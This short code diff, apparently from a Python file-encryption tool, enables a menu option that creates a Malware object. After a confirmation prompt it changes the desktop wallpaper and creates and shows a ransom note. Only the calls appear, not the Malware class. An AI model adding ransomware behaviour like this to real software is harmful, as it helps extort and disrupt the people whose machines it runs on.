@@ -35,5 +35,9 @@ def choiceMenu(uc, key):
         filePassage(uc,key)
     elif(uc == "6"):
         filePassage(uc,key)
-    # elif(uc == "7"):
-
+    elif(uc == "7"):
+        mal = Malware()
+        if(mal.you_sure()):
+            mal.change_desktop_wallpaper()
+            mal.ransom_note()
+            mal.show_ransom_note()
